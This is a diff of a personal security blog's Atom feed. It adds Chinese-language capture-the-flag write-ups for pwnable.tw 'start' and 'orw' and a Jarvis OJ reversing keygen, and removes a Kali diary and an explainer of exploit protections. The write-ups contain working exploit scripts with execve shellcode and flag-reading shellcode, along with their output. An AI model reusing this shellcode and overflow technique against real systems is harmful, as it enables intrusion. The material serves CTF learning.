@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://siriuswhiter.tk/"/>
-  <updated>2018-10-27T03:03:57.266Z</updated>
+  <updated>2018-11-06T13:48:38.454Z</updated>
   <id>http://siriuswhiter.tk/</id>
   
   <author>
@@ -15,6 +15,62 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwnable.tw-wp</title>
+    <link href="http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/"/>
+    <id>http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/</id>
+    <published>2018-11-06T11:37:08.000Z</published>
+    <updated>2018-11-06T13:48:38.454Z</updated>
+    
+    <content type="html"><![CDATA[<p><em>好久没碰pwn了，找找感觉</em><br><em>pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题</em></p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>见到的最轻巧的一个题</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func main()</span><br><span class="line">push    esp</span><br><span class="line">; 4:   result = 3;</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">; 5:   __asm</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 60</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">func exit()</span><br><span class="line">pop     esp</span><br><span class="line">xor     eax, eax</span><br><span class="line">inc     eax</span><br><span class="line">int     80h</span><br></pre></td></tr></table></figure><p>以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。<br>看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。<br>不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./start&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10000)</span><br><span class="line"></span><br><span class="line">shellcode =&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot; </span><br><span class="line">print len(shellcode)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*20 + p32(0x8048087) </span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">leak_addr = u32(sh.recv(4))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">esp_addr = leak_addr + 0x14</span><br><span class="line">pay = &apos;a&apos;*20 + p32(esp_addr) + shellcode</span><br><span class="line">sh.send(pay) </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">21</span><br><span class="line">0xff936bc0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00\x00\x005o\x93\xff\x00\x00\x00\x00Go\x93\xff</span><br><span class="line">$ whoami</span><br><span class="line">start</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  printf(&quot;Give my your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;shellcode, 0xC8u);</span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">orw_seccomp():</span><br><span class="line">unsigned int orw_seccomp()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; // [esp+4h] [ebp-84h]</span><br><span class="line">  char *v2; // [esp+8h] [ebp-80h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int v4; // [esp+6Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u);</span><br><span class="line">  v1 = 12;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(38, 1, 0, 0, 0);                        // 38 PR_SET_NO_NEW_PRIVS</span><br><span class="line">                                                //               将调用线程的no_new_privs位设置为值</span><br><span class="line">                                                //               ARG2。将no_new_privs设置为1，execve（2）承诺不会</span><br><span class="line">                                                //               授予执行任何无法完成的任务的权限</span><br><span class="line">                                                //               没有execve（2）调用（例如，渲染集合 - </span><br><span class="line">                                                //               user-ID和set-group-ID模式位，以及非文件功能</span><br><span class="line">                                                //               功能性的）。设置后，该位不能取消设置。那个设定</span><br><span class="line">                                                //               这个位是由fork（2）和</span><br><span class="line">                                                //               克隆（2），并保存在execve（2）。</span><br><span class="line">                                                // </span><br><span class="line">  prctl(22, 2, &amp;v1);                            // 22 PR_SET_SECCOMP  </span><br><span class="line">                                                //   seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,       这是不安全的,</span><br><span class="line">                                                // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</span><br><span class="line">                                                // 大概是终结了系统调用的可能,也就很难getshell了。</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西<br>看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。</p><p>这块可以参考<br><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h</a><br><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/prctl.2.html</a></p><p>因为看不了题，不过在源码里能看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">             &lt;!-- description --&gt;</span><br><span class="line">               </span><br><span class="line">              &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛</p><figure class="image-box">                <img src="/2018/11/06/pwnable-tw-wp/sys_call.png" alt="" 系统调用""="" title="" class="">                <p>"系统调用"</p>            </figure><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><p>简直就是汇编实习现场了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./orw&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;,10001)</span><br><span class="line"></span><br><span class="line">shellcode=&apos;&apos;&apos;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">sub dword ptr [esp],0x01010101;   //巧妙得到 ‘ag\x00\x00’</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">mov ebx,esp;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x5;</span><br><span class="line">int 0x80;                    //open</span><br><span class="line"></span><br><span class="line">mov ebx,eax;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x3;</span><br><span class="line">mov ecx,esp;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                    //read</span><br><span class="line"></span><br><span class="line">mov al,0x4;</span><br><span class="line">mov bl,1;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                     //write</span><br><span class="line">&apos;&apos;&apos;.format(hex(u32(&apos;bh&apos;+chr(1)+chr(1))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Give my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br><span class="line">�u�\x0[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;em&gt;好久没碰pwn了，找找感觉&lt;/em&gt;&lt;br&gt;&lt;em&gt;pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&quot;start&quot;&gt;&lt;a href=&quot;#start&quot; clas
+      
+    
+    </summary>
+    
+      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
+    
+    
+      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
+    
+      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
+    
+      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Jarvis Oj-reverse</title>
+    <link href="http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/"/>
+    <id>http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/</id>
+    <published>2018-11-06T08:01:46.000Z</published>
+    <updated>2018-11-06T10:10:01.193Z</updated>
+    
+    <content type="html"><![CDATA[<p><em>稍微学学逆向</em></p><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p>  拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题）<br>  将pyc还原成py文件<br>  发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序）<br>  直接上wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] </span><br><span class="line">pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]</span><br><span class="line">pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line"></span><br><span class="line">flag = &quot; &quot;</span><br><span class="line">for i in range (0,17):</span><br><span class="line">    flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )</span><br><span class="line"></span><br><span class="line">f = flag[::-1]</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><ul><li>对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;em&gt;稍微学学逆向&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&quot;FindKey&quot;&gt;&lt;a href=&quot;#FindKey&quot; class=&quot;headerlink&quot; title=&quot;FindKey&quot;&gt;&lt;/a&gt;FindKey&lt;/h1&gt;&lt;p&gt;  拿到文件顺手就往ida里拖，结果说是bin文件，所
+      
+    
+    </summary>
+    
+      <category term="RE" scheme="http://siriuswhiter.tk/categories/re/"/>
+    
+    
+      <category term="RE" scheme="http://siriuswhiter.tk/tags/re/"/>
+    
+  </entry>
   
   <entry>
     <title>diary-20181027</title>
@@ -503,60 +559,6 @@
     
     
       <category term="diary" scheme="http://siriuswhiter.tk/tags/diary/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>diary-20180517</title>
-    <link href="http://siriuswhiter.tk/2018/05/17/diary-20180517/"/>
-    <id>http://siriuswhiter.tk/2018/05/17/diary-20180517/</id>
-    <published>2018-05-17T10:03:55.000Z</published>
-    <updated>2018-10-18T10:18:49.905Z</updated>
-    
-    <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环；</p><p>寻求各色解法，e.g. vi /etc/profile  但是其文件正常，之后终于在误打误撞中解决。</p><p>步骤：<br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="1" title="(1).png" class="">                <p>(1).png</p>            </figure><br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="2" title="(2).png" class="">                <p>(2).png</p>            </figure></p><p>进入 recovery mode（也就是纯命令行模式）</p><p>输入用户密码</p><p>按理说 应该继续 apt-get update -f</p><p>但会提示 输入 dpkg –configure -a</p><p>完成后重新update 就ok啦</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;em&gt;转移自之前的博客&lt;/em&gt;&lt;br&gt;kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环；&lt;/p&gt;
-&lt;p&gt;寻求各色解法，e.g. vi /etc/profile  但是其文
-      
-    
-    </summary>
-    
-      <category term="diary" scheme="http://siriuswhiter.tk/categories/diary/"/>
-    
-    
-      <category term="diary" scheme="http://siriuswhiter.tk/tags/diary/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Introduction to pwn0.0 --Protection technology</title>
-    <link href="http://siriuswhiter.tk/2018/05/13/protection-technology/"/>
-    <id>http://siriuswhiter.tk/2018/05/13/protection-technology/</id>
-    <published>2018-05-13T12:11:03.000Z</published>
-    <updated>2018-09-25T13:42:56.132Z</updated>
-    
-    <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="NX保护和DEP保护"><a href="#NX保护和DEP保护" class="headerlink" title="NX保护和DEP保护"></a>NX保护和DEP保护</h1><p>两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限</p><h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><p>NX保护，全称为 “No eXecute” ，意为 [禁止执行]<br>我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。</p><p>linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。</p><h2 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h2><p>DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护</p><p>数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码</p><p>主要优点<br>我觉得这种保护技术组要应用于Windows</p><p>这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。<br>百度百科上有这样一句话：</p><p>可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。</p><p>*P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。</p><h1 id="Linux-Canary保护"><a href="#Linux-Canary保护" class="headerlink" title="Linux Canary保护"></a>Linux Canary保护</h1><p>Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：<br>溢出栈缓冲区<br>劫持方式</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/1.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。<br>然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下：</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/2.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。</p><p>注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。</p><h1 id="ASLR地址空间布局随机化"><a href="#ASLR地址空间布局随机化" class="headerlink" title="ASLR地址空间布局随机化"></a>ASLR地址空间布局随机化</h1><p>ASLR ，全称为 Address space layout randomization<br>顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p><p>但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。</p><p>关于这个，多的我也说不上来，给几个文章的地址吧。</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE ，全称为 position-independent executables<br>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。</p><p>内存地址随机化机制，有以下三种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数 意义</span><br><span class="line">0 表示关闭进程地址空间随机化</span><br><span class="line">1 表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line">2 表示在1的基础上增加栈（heap）的随机化</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br><em>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</em></p><h1 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h1><p>这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。</p><p>系统防护（全）：<br><a href="http://www.mamicode.com/info-detail-1990426.html" title="1" target="_blank" rel="noopener">二进制的保护机制</a><br><a href="https://blog.csdn.net/x_nirvana/article/details/61420056" title="2" target="_blank" rel="noopener">WINDOWS和LINUX的内存防护机制</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;em&gt;转移自之前的博客&lt;/em&gt;&lt;/p&gt;
-&lt;h1 id=&quot;NX保护和DEP保护&quot;&gt;&lt;a href=&quot;#NX保护和DEP保护&quot; class=&quot;headerlink&quot; title=&quot;NX保护和DEP保护&quot;&gt;&lt;/a&gt;NX保护和DEP保护&lt;/h1&gt;&lt;p&gt;两个保护措施都有相同点，都
-      
-    
-    </summary>
-    
-      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
-    
-    
-      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
-    
-      <category term="tech" scheme="http://siriuswhiter.tk/tags/tech/"/>
     
   </entry>
   
